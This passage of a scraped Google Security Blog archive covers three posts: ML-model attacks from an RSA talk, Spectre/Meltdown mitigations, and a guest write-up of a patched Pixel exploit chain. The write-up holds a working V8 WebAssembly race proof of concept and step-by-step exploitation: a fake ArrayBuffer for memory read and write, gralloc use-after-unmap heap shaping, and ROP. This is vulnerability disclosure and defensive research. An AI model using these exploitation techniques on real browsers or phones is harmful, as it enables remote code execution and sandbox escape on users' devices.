to cause it to make a mistake, and more.    Our talk also looked at various defense solutions, including differential privacy, which provides a rigorous theoretical framework for preventing attackers from recovering private training data.    Hopefully you were to able to join us at RSA! But if not, here is  re-recording  and  the slides  of our first talk on applying AI to abuse-prevention, along with the  slides  from our second talk about protecting ML models.                                              Posted by Elie Bursztein, Anti-Abuse Research Lead - Ian Goodfellow, Adversarial Machine Learning Research Lead  Recent advances in AI are transforming how we combat fraud and abuse and implement new security protections. These advances are critical to meeting our users’ expectations and keeping increasingly sophisticated attackers at bay, but they come with brand new challenges as well.  This week at RSA, we explored the intersection between AI, anti-abuse, and security in two talks.  Our first talk provided a concise overview of how we apply AI to fraud and abuse problems. The talk started by detailing the fundamental reasons why AI is key to building defenses that keep up with user expectations and combat increasingly sophisticated attacks. It then delved into the top 10 anti-abuse specific challenges encountered while applying AI to abuse fighting and how to overcome them. Check out the infographic at the end of the post for a quick overview of the challenges we covered during the talk.  Our second talk looked at attacks on ML models themselves and the ongoing effort to develop new defenses.  It covered attackers’ attempts to recover private training data, to introduce examples into the training set of a machine learning model to cause it to learn incorrect behaviors, to modify the input that a machine learning model receives at classification time to cause it to make a mistake, and more.  Our talk also looked at various defense solutions, including differential privacy, which provides a rigorous theoretical framework for preventing attackers from recovering private training data.  Hopefully you were to able to join us at RSA! But if not, here is re-recording and the slides of our first talk on applying AI to abuse-prevention, along with the slides from our second talk about protecting ML models.        ", "date": "April 20, 2018"},
{"website": "Google-Security", "title": "\nMore details about mitigations for the CPU Speculative Execution issue\n", "author": ["Posted by Matt Linton, Senior Security Engineer and Pat Parseghian, Technical Program Manager"], "link": "https://security.googleblog.com/2018/01/more-details-about-mitigations-for-cpu_4.html", "abstract": "                             Posted by Matt Linton, Senior Security Engineer and Pat Parseghian, Technical Program Manager     Yesterday, Google&#8217;s Project Zero team posted  detailed technical information  on three variants of a new security issue involving speculative execution on many modern CPUs. Today, we&#8217;d like to share some more information about our mitigations and performance.    In response to the vulnerabilities that were discovered we developed a novel mitigation called &#8220; Retpoline &#8221; -- a binary modification technique that protects against &#8220;branch target injection&#8221; attacks. We shared Retpoline with our industry partners and have deployed it on Google&#8217;s systems, where we have observed negligible impact on performance.    In addition, we have deployed Kernel Page Table Isolation (KPTI) -- a general purpose technique for better protecting sensitive information in memory from other software running on a machine -- to the entire fleet of Google Linux production servers that support all of our products, including Search, Gmail, YouTube, and Google Cloud Platform.    There has been speculation that the deployment of KPTI causes significant performance slowdowns. Performance can vary, as the impact of the KPTI mitigations depends on the rate of system calls made by an application. On most of our workloads, including our cloud infrastructure, we see negligible impact on performance.    In our own testing, we have found that microbenchmarks can show an exaggerated impact. Of course, Google recommends thorough testing in your environment before deployment; we cannot guarantee any particular performance or operational impact.     Speculative Execution and the Three Methods of Attack       In addition, to follow up on yesterday&#8217;s  post , today we&#8217;re providing a summary of speculative execution and how each of the three variants work.    In order to improve performance, many CPUs may choose to speculatively execute instructions based on assumptions that are considered likely to be true. During speculative execution, the processor is verifying these assumptions; if they are valid, then the execution continues. If they are invalid, then the execution is unwound, and the correct execution path can be started based on the actual conditions. It is possible for this speculative execution to have side effects which are not restored when the CPU state is unwound, and can lead to information disclosure.    Project Zero discussed three variants of speculative execution attack. There is no single fix for all three attack variants; each requires protection independently.       Variant 1 ( CVE-2017-5753 ), &#8220;bounds check bypass.&#8221; This vulnerability affects specific sequences within compiled applications, which must be addressed on a per-binary basis.   Variant 2 ( CVE-2017-5715 ), &#8220;branch target injection&#8221;. This variant may either be fixed by a CPU microcode update from the CPU vendor, or by applying a software mitigation technique called &#8220; Retpoline &#8221; to binaries where concern about information leakage is present. This mitigation may be applied to the operating system kernel, system programs and libraries, and individual software programs, as needed.   Variant 3 ( CVE-2017-5754 ), &#8220;rogue data cache load.&#8221; This may require patching the system&#8217;s operating system. For Linux there is a patchset called KPTI (Kernel Page Table Isolation) that helps mitigate Variant 3. Other operating systems may implement similar protections - check with your vendor for specifics.                         Summary        Mitigation           Variant 1: bounds check bypass (   CVE-2017-5753   )           This attack variant allows malicious code to circumvent bounds checking features built into most binaries. Even though the bounds checks will still fail, the CPU will speculatively execute instructions after the bounds checks, which can access memory that the code could not normally access. When the CPU determines the bounds check has failed, it discards any work that was done speculatively; however, some changes to the system can be still observed (in particular, changes to the state of the CPU caches). The malicious code can detect these changes and read the data that was speculatively accessed.        The primary ramification of Variant 1 is that it is difficult for a system to run untrusted code within a process and restrict what memory within the process the untrusted code can access.        In the kernel, this has implications for systems such as the extended Berkeley Packet Filter (eBPF) that takes packet filterers from user space code, just-in-time (JIT) compiles the packet filter code, and runs the packet filter within the context of kernel. The JIT compiler uses bounds checking to limit the memory the packet filter can access, however, Variant 1 allows an attacker to use speculation to circumvent these limitations.              Mitigation requires analysis and recompilation so that vulnerable binary code is not emitted. Examples of targets which may require patching include the operating system and applications which execute untrusted code.           Variant 2: branch target injection (   CVE-2017-5715   )           This attack variant uses the ability of one process to influence the speculative execution behavior of code in another security context (i.e., guest/host mode, CPU ring, or process) running on the same physical CPU core.        Modern processors predict the destination for indirect jumps and calls that a program may take and start speculatively executing code at the predicted location. The tables used to drive prediction are shared between processes running on a physical CPU core, and it is possible for one process to pollute the branch prediction tables to influence the branch prediction of another process or kernel code.        In this way, an attacker can cause speculative execution of any mapped code in another process, in the hypervisor, or in the kernel, and potentially read data from the other protection domain using techniques like Variant 1. This variant is difficult to use, but has great potential power as it crosses arbitrary protection domains.        Mitigating this attack variant requires either installing and enabling a CPU microcode update from the CPU vendor (e.g., Intel's IBRS microcode), or applying a software mitigation (e.g., Google's Retpoline) to the hypervisor, operating system kernel, system programs and libraries, and user applications.           Variant 3: rogue data cache load (   CVE-2017-5754   )           This attack variant allows a user mode process to access virtual memory as if the process was in kernel mode. On some processors, the speculative execution of code can access memory that is not typically visible to the current execution mode of the processor; i.e., a user mode program may speculatively access memory as if it were running in kernel mode.        Using the techniques of Variant 1, a process can observe the memory that was accessed speculatively. On most operating systems today, the page table that a process uses includes access to most physical memory on the system, however access to such memory is limited to when the process is running in kernel mode. Variant 3 enables access to such memory even in user mode, violating the protections of the hardware.        Mitigating this attack variant requires patching the operating system. For Linux, the patchset that mitigates Variant 3 is called Kernel Page Table Isolation (KPTI). Other operating systems/providers should implement similar mitigations.                Mitigations for Google products       You can learn more about mitigations that have been applied to Google&#8217;s infrastructure, products, and services  here .                                   Posted by Matt Linton, Senior Security Engineer and Pat Parseghian, Technical Program Manager  Yesterday, Google’s Project Zero team posted detailed technical information on three variants of a new security issue involving speculative execution on many modern CPUs. Today, we’d like to share some more information about our mitigations and performance.  In response to the vulnerabilities that were discovered we developed a novel mitigation called “Retpoline” -- a binary modification technique that protects against “branch target injection” attacks. We shared Retpoline with our industry partners and have deployed it on Google’s systems, where we have observed negligible impact on performance.  In addition, we have deployed Kernel Page Table Isolation (KPTI) -- a general purpose technique for better protecting sensitive information in memory from other software running on a machine -- to the entire fleet of Google Linux production servers that support all of our products, including Search, Gmail, YouTube, and Google Cloud Platform.  There has been speculation that the deployment of KPTI causes significant performance slowdowns. Performance can vary, as the impact of the KPTI mitigations depends on the rate of system calls made by an application. On most of our workloads, including our cloud infrastructure, we see negligible impact on performance.  In our own testing, we have found that microbenchmarks can show an exaggerated impact. Of course, Google recommends thorough testing in your environment before deployment; we cannot guarantee any particular performance or operational impact.  Speculative Execution and the Three Methods of Attack  In addition, to follow up on yesterday’s post, today we’re providing a summary of speculative execution and how each of the three variants work.  In order to improve performance, many CPUs may choose to speculatively execute instructions based on assumptions that are considered likely to be true. During speculative execution, the processor is verifying these assumptions; if they are valid, then the execution continues. If they are invalid, then the execution is unwound, and the correct execution path can be started based on the actual conditions. It is possible for this speculative execution to have side effects which are not restored when the CPU state is unwound, and can lead to information disclosure.  Project Zero discussed three variants of speculative execution attack. There is no single fix for all three attack variants; each requires protection independently.   Variant 1 (CVE-2017-5753), “bounds check bypass.” This vulnerability affects specific sequences within compiled applications, which must be addressed on a per-binary basis. Variant 2 (CVE-2017-5715), “branch target injection”. This variant may either be fixed by a CPU microcode update from the CPU vendor, or by applying a software mitigation technique called “Retpoline” to binaries where concern about information leakage is present. This mitigation may be applied to the operating system kernel, system programs and libraries, and individual software programs, as needed. Variant 3 (CVE-2017-5754), “rogue data cache load.” This may require patching the system’s operating system. For Linux there is a patchset called KPTI (Kernel Page Table Isolation) that helps mitigate Variant 3. Other operating systems may implement similar protections - check with your vendor for specifics.       Summary  Mitigation   Variant 1: bounds check bypass (CVE-2017-5753)   This attack variant allows malicious code to circumvent bounds checking features built into most binaries. Even though the bounds checks will still fail, the CPU will speculatively execute instructions after the bounds checks, which can access memory that the code could not normally access. When the CPU determines the bounds check has failed, it discards any work that was done speculatively; however, some changes to the system can be still observed (in particular, changes to the state of the CPU caches). The malicious code can detect these changes and read the data that was speculatively accessed.   The primary ramification of Variant 1 is that it is difficult for a system to run untrusted code within a process and restrict what memory within the process the untrusted code can access.   In the kernel, this has implications for systems such as the extended Berkeley Packet Filter (eBPF) that takes packet filterers from user space code, just-in-time (JIT) compiles the packet filter code, and runs the packet filter within the context of kernel. The JIT compiler uses bounds checking to limit the memory the packet filter can access, however, Variant 1 allows an attacker to use speculation to circumvent these limitations.  Mitigation requires analysis and recompilation so that vulnerable binary code is not emitted. Examples of targets which may require patching include the operating system and applications which execute untrusted code.   Variant 2: branch target injection (CVE-2017-5715)   This attack variant uses the ability of one process to influence the speculative execution behavior of code in another security context (i.e., guest/host mode, CPU ring, or process) running on the same physical CPU core.   Modern processors predict the destination for indirect jumps and calls that a program may take and start speculatively executing code at the predicted location. The tables used to drive prediction are shared between processes running on a physical CPU core, and it is possible for one process to pollute the branch prediction tables to influence the branch prediction of another process or kernel code.   In this way, an attacker can cause speculative execution of any mapped code in another process, in the hypervisor, or in the kernel, and potentially read data from the other protection domain using techniques like Variant 1. This variant is difficult to use, but has great potential power as it crosses arbitrary protection domains.  Mitigating this attack variant requires either installing and enabling a CPU microcode update from the CPU vendor (e.g., Intel's IBRS microcode), or applying a software mitigation (e.g., Google's Retpoline) to the hypervisor, operating system kernel, system programs and libraries, and user applications.   Variant 3: rogue data cache load (CVE-2017-5754)   This attack variant allows a user mode process to access virtual memory as if the process was in kernel mode. On some processors, the speculative execution of code can access memory that is not typically visible to the current execution mode of the processor; i.e., a user mode program may speculatively access memory as if it were running in kernel mode.   Using the techniques of Variant 1, a process can observe the memory that was accessed speculatively. On most operating systems today, the page table that a process uses includes access to most physical memory on the system, however access to such memory is limited to when the process is running in kernel mode. Variant 3 enables access to such memory even in user mode, violating the protections of the hardware.  Mitigating this attack variant requires patching the operating system. For Linux, the patchset that mitigates Variant 3 is called Kernel Page Table Isolation (KPTI). Other operating systems/providers should implement similar mitigations.     Mitigations for Google products  You can learn more about mitigations that have been applied to Google’s infrastructure, products, and services here.     ", "date": "January 4, 2018"},
{"website": "Google-Security", "title": "\nAndroid Security Ecosystem Investments Pay Dividends for Pixel\n", "author": ["Posted by Mayank Jain and Scott Roberts, Android security team"], "link": "https://security.googleblog.com/2018/01/android-security-ecosystem-investments.html", "abstract": "                             Posted by Mayank Jain and Scott Roberts, Android security team      [Cross-posted from the  Android Developers Blog ]     In June 2017, the Android security team  increased the top payouts  for the  Android Security Rewards  (ASR) program and worked with researchers to streamline the exploit submission process. In August 2017, Guang Gong ( @oldfresher ) of Alpha Team, Qihoo 360 Technology Co. Ltd. submitted the first working remote exploit chain since the ASR program's expansion. For his detailed report, Gong was awarded $105,000, which is the highest reward in the history of the ASR program and $7500 by  Chrome Rewards program  for a total of $112,500. The complete set of issues was resolved as part of the  December 2017 monthly security update.  Devices with the security patch level of 2017-12-05 or later are protected from these issues.     All Pixel devices or partner devices using  A/B (seamless) system updates  will automatically install these updates; users must restart their devices to complete the installation.   The Android Security team would like to thank Guang Gong and the  researcher community  for their contributions to Android security. If you'd like to participate in Android Security Rewards program, check out our  Program rules . For tips on how to submit reports, see  Bug Hunter University .    The following article is a guest blog post authored by Guang Gong of Alpha team, Qihoo 360 Technology Ltd.       Technical details of a Pixel remote exploit chain   The Pixel phone is protected by many layers of security. It was the only device that was not pwned in the  2017 Mobile Pwn2Own  competition. But in August 2017, my team discovered a remote exploit chain&#8212;the first of its kind since the ASR program expansion. Thanks to the Android security team for their responsiveness and help during the submission process.   This blog post covers the technical details of the exploit chain. The exploit chain includes two bugs, CVE-2017-5116 and CVE-2017-14904.  CVE-2017-5116  is a V8 engine bug that is used to get remote code execution in sandboxed Chrome render process.  CVE-2017-14904 is a bug in Android's libgralloc module that is used to escape from Chrome's sandbox. Together, this exploit chain can be used to inject arbitrary code into system_server by accessing a malicious URL in Chrome. To reproduce the exploit, an example vulnerable environment is Chrome 60.3112.107 + Android 7.1.2  (Security patch level 2017-8-05) (google/sailfish/sailfish:7.1.2/NJH47F/4146041:user/release-keys).       The RCE bug (CVE-2017-5116)   New features usually bring new bugs.  V8 6.0  introduces support for  SharedArrayBuffer , a low-level mechanism to share memory between JavaScript workers and synchronize control flow across workers. SharedArrayBuffers give JavaScript access to shared memory, atomics, and futexes.  WebAssembly  is a new type of code that can be run in modern web browsers&#8212; it is a low-level assembly-like language with a compact binary format that runs with near-native performance and provides languages, such as C/C++, with a compilation target so that they can run on the web. By combining the three features, SharedArrayBuffer WebAssembly, and web worker in Chrome, an OOB access can be triggered through a race condition. Simply speaking, WebAssembly code can be put into a SharedArrayBuffer and then transferred to a web worker. When the main thread parses the WebAssembly code, the worker thread can modify the code at the same time, which causes an OOB access.    The buggy code is in the function  GetFirstArgumentAsBytes  where the argument args may be an ArrayBuffer or TypedArray object. After SharedArrayBuffer is imported to JavaScript, a TypedArray may be backed by a SharedArraybuffer, so the content of the TypedArray may be modified by other worker threads at any time.    i::wasm::ModuleWireBytes GetFirstArgumentAsBytes(     const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args, ErrorThrower* thrower) {   ......   } else if (source-&gt;IsTypedArray()) {    //---&gt;source should be checked if it's backed by a SharedArrayBuffer     // A TypedArray was passed.     Local&lt;TypedArray&gt; array = Local&lt;TypedArray&gt;::Cast(source);     Local&lt;ArrayBuffer&gt; buffer = array-&gt;Buffer();     ArrayBuffer::Contents contents = buffer-&gt;GetContents();     start =         reinterpret_cast&lt;const byte*&gt;(contents.Data()) + array-&gt;ByteOffset();     length = array-&gt;ByteLength();   }    ......   return i::wasm::ModuleWireBytes(start, start + length); }   A simple PoC is as follows:    &lt;html&gt; &lt;h1&gt;poc&lt;/h1&gt; &lt;script id=\"worker1\"&gt; worker:{        self.onmessage = function(arg) {         console.log(\"worker started\");         var ta = new Uint8Array(arg.data);         var i =0;         while(1){             if(i==0){                 i=1;                 ta[51]=0;   //---&gt;4)modify the webassembly code at the same time             }else{                 i=0;                 ta[51]=128;             }         }     } } &lt;/script&gt; &lt;script&gt; function getSharedTypedArray(){     var wasmarr = [         0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,         0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,         0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e,         0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65,         0x72, 0x50, 0x6c, 0x75, 0x73, 0x31, 0x00, 0x01,         0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b,         0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b];     var sb = new SharedArrayBuffer(wasmarr.length);           //---&gt; 1)put WebAssembly code in a SharedArrayBuffer     var sta = new Uint8Array(sb);     for(var i=0;i&lt;sta.length;i++)         sta[i]=wasmarr[i];     return sta;     } var blob = new Blob([         document.querySelector('#worker1').textContent         ], { type: \"text/javascript\" }) var worker = new Worker(window.URL.createObjectURL(blob));   //---&gt; 2)create a web worker var sta = getSharedTypedArray(); worker.postMessage(sta.buffer);                              //---&gt;3)pass the WebAssembly code to the web worker setTimeout(function(){         while(1){         try{         sta[51]=0;         var myModule = new WebAssembly.Module(sta);          //---&gt;4)parse the WebAssembly code         var myInstance = new WebAssembly.Instance(myModule);         //myInstance.exports.getAnswerPlus1();         }catch(e){         }         }     },1000); //worker.terminate();  &lt;/script&gt; &lt;/html&gt;   The text format of the WebAssembly code is as follows:    00002b func[0]: 00002d: 41 2a                      | i32.const 42 00002f: 0b                         | end 000030 func[1]: 000032: 10 00                      | call 0 000034: 41 01                      | i32.const 1 000036: 6a                         | i32.add 000037: 0b                         | end   First, the above binary format WebAssembly code is put into a SharedArrayBuffer, then a TypedArray Object is created, using the SharedArrayBuffer as buffer. After that, a worker thread is created and the SharedArrayBuffer is passed to the newly created worker thread. While the main thread is parsing the WebAssembly Code, the worker thread modifies the SharedArrayBuffer at the same time. Under this circumstance, a race condition causes a  TOCTOU  issue. After the main thread's bound check, the instruction \" call 0\" can be modified by the worker thread to \"call 128\" and then be parsed and compiled by the main thread, so an OOB access occurs.   Because the \"call 0\" Web Assembly instruction can be modified  to call any other Web Assembly functions, the exploitation of this bug is straightforward. If \"call 0\" is modified to \"call $leak\", registers and stack contents are dumped to Web Assembly memory. Because function 0 and function $leak have a different number of arguments, this results in many useful pieces of data in the stack being leaked.     (func $leak(param i32 i32 i32 i32 i32 i32)(result i32)     i32.const 0     get_local 0     i32.store     i32.const 4     get_local 1     i32.store     i32.const 8     get_local 2     i32.store     i32.const 12     get_local 3     i32.store     i32.const 16     get_local 4     i32.store     i32.const 20     get_local 5     i32.store     i32.const 0   ))   Not only the instruction \"call 0\" can be modified, any \"call funcx\" instruction can be modified. Assume funcx is a wasm function with 6 arguments as follows, when v8 compiles funcx in ia32 architecture, the first 5 arguments are passed through the registers and the sixth argument is passed through stack. All the arguments can be set to any value by JavaScript:    /*Text format of funcx*/  (func $simple6 (param i32 i32 i32 i32 i32 i32 ) (result i32)     get_local 5     get_local 4     i32.add) /*Disassembly code of funcx*/ --- Code --- kind = WASM_FUNCTION name = wasm#1 compiler = turbofan Instructions (size = 20) 0x58f87600     0  8b442404       mov eax,[esp+0x4] 0x58f87604     4  03c6           add eax,esi 0x58f87606     6  c20400         ret 0x4 0x58f87609     9  0f1f00         nop Safepoints (size = 8) RelocInfo (size = 0) --- End code ---   When a JavaScript function calls a WebAssembly function, v8 compiler creates a JS_TO_WASM function internally, after compilation, the JavaScript function will call the created JS_TO_WASM function and then the created JS_TO_WASM function will call the WebAssembly function. JS_TO_WASM functions use different call convention, its first arguments is passed through stack. If \"call funcx\" is modified to call the following JS_TO_WASM function.    /*Disassembly code of JS_TO_WASM function */ --- Code --- kind = JS_TO_WASM_FUNCTION name = js-to-wasm#0 compiler = turbofan Instructions (size = 170) 0x4be08f20     0  55             push ebp 0x4be08f21     1  89e5           mov ebp,esp 0x4be08f23     3  56             push esi 0x4be08f24     4  57             push edi 0x4be08f25     5  83ec08         sub esp,0x8 0x4be08f28     8  8b4508         mov eax,[ebp+0x8] 0x4be08f2b     b  e8702e2bde     call 0x2a0bbda0  (ToNumber)    ;; code: BUILTIN 0x4be08f30    10  a801           test al,0x1 0x4be08f32    12  0f852a000000   jnz 0x4be08f62  &lt;+0x42&gt;   The JS_TO_WASM function will take the sixth arguments of funcx as its first argument, but it takes its first argument as an object pointer, so type confusion will be triggered when the argument is passed to the ToNumber function, which means we can pass any values as an object pointer to the ToNumber function. So we can fake an ArrayBuffer object in some address such as in a double array and pass the address to ToNumber.  The layout of an ArrayBuffer is as follows:    /* ArrayBuffer layouts 40 Bytes*/                                                                                                                          Map                                                                                                                                                        Properties                                                                                                                                                 Elements                                                                                                                                                   ByteLength                                                                                                                                                 BackingStore                                                                                                                                               AllocationBase                                                                                                                                             AllocationLength                                                                                                                                           Fields                                                                                                                                                     internal                                                                                                                                                   internal                                                                                                                                                                                                                                                                                                       /* Map layouts 44 Bytes*/                                                                                                                                    static kMapOffset = 0,                                                                                                                                     static kInstanceSizesOffset = 4,                                                                                                                           static kInstanceAttributesOffset = 8,                                                                                                                      static kBitField3Offset = 12,                                                                                                                              static kPrototypeOffset = 16,                                                                                                                              static kConstructorOrBackPointerOffset = 20,                                                                                                               static kTransitionsOrPrototypeInfoOffset = 24,                                                                                                             static kDescriptorsOffset = 28,                                                                                                                            static kLayoutDescriptorOffset = 1,                                                                                                                        static kCodeCacheOffset = 32,                                                                                                                              static kDependentCodeOffset = 36,                                                                                                                          static kWeakCellCacheOffset = 40,                                                                                                                          static kPointerFieldsBeginOffset = 16,                                                                                                                     static kPointerFieldsEndOffset = 44,                                                                                                                       static kInstanceSizeOffset = 4,                                                                                                                            static kInObjectPropertiesOrConstructorFunctionIndexOffset = 5,                                                                                            static kUnusedOffset = 6,                                                                                                                                  static kVisitorIdOffset = 7,                                                                                                                               static kInstanceTypeOffset = 8,     //one byte                                                                                                             static kBitFieldOffset = 9,                                                                                                                                static kInstanceTypeAndBitFieldOffset = 8,                                                                                                                 static kBitField2Offset = 10,                                                                                                                              static kUnusedPropertyFieldsOffset = 11   Because the content of the stack can be leaked, we can get many useful data to fake the ArrayBuffer. For example, we can leak the start address of an object, and calculate the start address of its elements, which is a FixedArray object. We can use this FixedArray object as the faked ArrayBuffer's properties and elements fields. We have to fake the map of the ArrayBuffer too, luckily, most of the fields of the map are not used when the bug is triggered. But the InstanceType in offset 8 has to be set to 0xc3(this value depends on the version of v8) to indicate this object is an ArrayBuffer.  In order to get a reference of the faked ArrayBuffer in JavaScript, we have to set the Prototype field of Map in offset 16 to an object whose Symbol.toPrimitive property is a JavaScript call back function. When the faked array buffer is passed to the ToNumber function, to convert the ArrayBuffer object to a Number, the call back function will be called, so we can get a reference of the faked ArrayBuffer in the call back function. Because the ArrayBuffer is faked in a double array, the content of the array can be set to any value, so we can change the field BackingStore and ByteLength of the faked array buffer to get arbitrary memory read and write. With arbitrary memory read/write, executing shellcode is simple. As JIT Code in Chrome is readable, writable and executable, we can overwrite it to execute shellcode.   Chrome team fixed this bug very quickly in chrome 61.0.3163.79, just a week after I submitted the exploit.       The EoP Bug (CVE-2017-14904)   The sandbox escape bug is caused by map and unmap mismatch, which causes a Use-After-Unmap issue. The buggy code is in the functions  gralloc_map  and  gralloc_unmap :    static int gralloc_map(gralloc_module_t const* module,                        buffer_handle_t handle) { &#8230;&#8230;     private_handle_t* hnd = (private_handle_t*)handle;     &#8230;&#8230;     if (!(hnd-&gt;flags &amp; private_handle_t::PRIV_FLAGS_FRAMEBUFFER) &amp;&amp;         !(hnd-&gt;flags &amp; private_handle_t::PRIV_FLAGS_SECURE_BUFFER)) {         size = hnd-&gt;size;         err = memalloc-&gt;map_buffer(&amp;mappedAddress, size,                                        hnd-&gt;offset, hnd-&gt;fd);        //---&gt; mapped an ashmem and get the mapped address. the ashmem fd and offset can be controlled by Chrome render process.         if(err || mappedAddress == MAP_FAILED) {             ALOGE(\"Could not mmap handle %p, fd=%d (%s)\",                   handle, hnd-&gt;fd, strerror(errno));             return -errno;         }         hnd-&gt;base = uint64_t(mappedAddress) + hnd-&gt;offset;          //---&gt; save mappedAddress+offset to hnd-&gt;base     } else {         err = -EACCES; } &#8230;&#8230;     return err; }   gralloc_map maps a graphic buffer controlled by the arguments handle to memory space and gralloc_unmap unmaps it. While mapping, the mappedAddress plus hnd-&gt;offset is stored to hnd-&gt;base, but while unmapping, hnd-&gt;base is passed to system call unmap directly minus the offset. hnd-&gt;offset can be manipulated from a Chrome's sandboxed process, so it's possible to unmap any pages in system_server from Chrome's sandboxed render process.    static int gralloc_unmap(gralloc_module_t const* module,                          buffer_handle_t handle) {   &#8230;&#8230;     if(hnd-&gt;base) {         err = memalloc-&gt;unmap_buffer((void*)hnd-&gt;base, hnd-&gt;size, hnd-&gt;offset);    //---&gt; while unmapping, hnd-&gt;offset is not used, hnd-&gt;base is used as the base address, map and unmap are mismatched.         if (err) {             ALOGE(\"Could not unmap memory at address %p, %s\", (void*) hnd-&gt;base,                     strerror(errno));             return -errno;         }         hnd-&gt;base = 0; } &#8230;&#8230;     return 0; } int IonAlloc::unmap_buffer(void *base, unsigned int size,         unsigned int /*offset*/)                               //---&gt; look, offset is not used by unmap_buffer {     int err = 0;     if(munmap(base, size)) {         err = -errno;         ALOGE(\"ion: Failed to unmap memory at %p : %s\",               base, strerror(errno));     }     return err; }   Although SeLinux restricts the domain isolated_app to access most of Android system service, isolated_app can still access three Android system services.    52neverallow isolated_app { 53    service_manager_type 54    -activity_service 55    -display_service 56    -webviewupdate_service 57}:service_manager find;   To trigger the aforementioned Use-After-Unmap bug from Chrome's sandbox, first put a GraphicBuffer object, which is parseable into a bundle, and then call the binder method convertToTranslucent of IActivityManager to pass the malicious bundle to system_server. When system_server handles this malicious bundle, the bug is triggered.    This EoP bug targets the same attack surface as the bug in our 2016 MoSec presentation,   A Way of Breaking Chrome's Sandbox in Android  . It is also similar to  Bitunmap , except  exploiting it from a sandboxed Chrome render process is more difficult than from an app.    To exploit this EoP bug:   1. Address space shaping. Make the address space layout look as follows, a heap chunk is right above some continuous ashmem mapping:    7f54600000-7f54800000 rw-p 00000000 00:00 0           [anon:libc_malloc] 7f58000000-7f54a00000 rw-s 001fe000 00:04 32783         /dev/ashmem/360alpha29 (deleted) 7f54a00000-7f54c00000 rw-s 00000000 00:04 32781         /dev/ashmem/360alpha28 (deleted) 7f54c00000-7f54e00000 rw-s 00000000 00:04 32779         /dev/ashmem/360alpha27 (deleted) 7f54e00000-7f55000000 rw-s 00000000 00:04 32777         /dev/ashmem/360alpha26 (deleted) 7f55000000-7f55200000 rw-s 00000000 00:04 32775         /dev/ashmem/360alpha25 (deleted) ......   2. Unmap part of the heap (1 KB) and part of an ashmem memory (2MB&#8211;1KB) by triggering the bug:     7f54400000-7f54600000 rw-s 00000000 00:04 31603         /dev/ashmem/360alpha1000 (deleted) 7f54600000-7f547ff000 rw-p 00000000 00:00 0           [anon:libc_malloc] //---&gt;There is a 2MB memory gap 7f549ff000-7f54a00000 rw-s 001fe000 00:04 32783        /dev/ashmem/360alpha29 (deleted) 7f54a00000-7f54c00000 rw-s 00000000 00:04 32781        /dev/ashmem/360alpha28 (deleted) 7f54c00000-7f54e00000 rw-s 00000000 00:04 32779        /dev/ashmem/360alpha27 (deleted) 7f54e00000-7f55000000 rw-s 00000000 00:04 32777        /dev/ashmem/360alpha26 (deleted) 7f55000000-7f55200000 rw-s 00000000 00:04 32775        /dev/ashmem/360alpha25 (deleted)   3. Fill the unmapped space with an ashmem memory:    7f54400000-7f54600000 rw-s 00000000 00:04 31603      /dev/ashmem/360alpha1000 (deleted) 7f54600000-7f547ff000 rw-p 00000000 00:00 0         [anon:libc_malloc] 7f547ff000-7f549ff000 rw-s 00000000 00:04 31605       /dev/ashmem/360alpha1001 (deleted)   //---&gt;The gap is filled with the ashmem memory 360alpha1001 7f549ff000-7f54a00000 rw-s 001fe000 00:04 32783      /dev/ashmem/360alpha29 (deleted) 7f54a00000-7f54c00000 rw-s 00000000 00:04 32781      /dev/ashmem/360alpha28 (deleted) 7f54c00000-7f54e00000 rw-s 00000000 00:04 32779      /dev/ashmem/360alpha27 (deleted) 7f54e00000-7f55000000 rw-s 00000000 00:04 32777      /dev/ashmem/360alpha26 (deleted) 7f55000000-7f55200000 rw-s 00000000 00:04 32775      /dev/ashmem/360alpha25 (deleted)   4. Spray the heap and the heap data will be written to the ashmem memory:    7f54400000-7f54600000 rw-s 00000000 00:04 31603        /dev/ashmem/360alpha1000 (deleted) 7f54600000-7f547ff000 rw-p 00000000 00:00 0           [anon:libc_malloc] 7f547ff000-7f549ff000 rw-s 00000000 00:04 31605          /dev/ashmem/360alpha1001 (deleted) //---&gt;the heap manager believes the memory range from 0x7f547ff000 to 0x7f54800000 is still mongered by it and will allocate memory from this range, result in heap data is written to ashmem memory 7f549ff000-7f54a00000 rw-s 001fe000 00:04 32783        /dev/ashmem/360alpha29 (deleted) 7f54a00000-7f54c00000 rw-s 00000000 00:04 32781        /dev/ashmem/360alpha28 (deleted) 7f54c00000-7f54e00000 rw-s 00000000 00:04 32779        /dev/ashmem/360alpha27 (deleted) 7f54e00000-7f55000000 rw-s 00000000 00:04 32777        /dev/ashmem/360alpha26 (deleted) 7f55000000-7f55200000 rw-s 00000000 00:04 32775        /dev/ashmem/360alpha25 (deleted)   5. Because the filled ashmem in step 3 is mapped both by system_server and render process, part of the heap of system_server can be read and written by render process and we can trigger system_server to allocate some  GraphicBuffer  object in ashmem. As GraphicBuffer is inherited from ANativeWindowBuffer, which has a member named common whose type is android_native_base_t, we can read two function points (incRef and decRef) from ashmem memory and then can calculate the base address of the module libui. In the latest Pixel device, Chrome's render process is still 32-bit process but system_server is 64-bit process. So we have to leak some module's base address for ROP. Now that we have the base address of libui, the last step is  to trigger ROP. Unluckily, it seems that the points incRef and decRef haven't been used. It's impossible to modify it to jump to ROP, but we can modify the virtual table of GraphicBuffer to trigger ROP.    typedef struct android_native_base_t {     /* a magic value defined by the actual EGL native type */     int magic;     /* the sizeof() of the actual EGL native type */     int version;     void* reserved[4];     /* reference-counting interface */     void (*incRef)(struct android_native_base_t* base);     void (*decRef)(struct android_native_base_t* base); } android_native_base_t;   6.Trigger a GC to execute ROP   When a GraphicBuffer object is deconstructed, the virtual function onLastStrongRef is called, so we can replace this virtual function to jump to ROP. When GC happens, the control flow goes to ROP. Finding an ROP chain in limited module(libui) is challenging, but after hard work, we successfully found one and dumped the contents of the file into /data/misc/wifi/wpa_supplicant.conf .      Summary   The Android security team responded quickly to our report and included the fix for these two bugs in the  December 2017 Security Update . Supported Google device and devices with the security patch level of 2017-12-05 or later address these issues. While parsing untrusted parcels still happens in sensitive locations, the Android security team is working on hardening the platform to mitigate against similar vulnerabilities.     The EoP bug was discovered thanks to a joint effort between 360 Alpha Team and 360 C0RE Team. Thanks very much for their 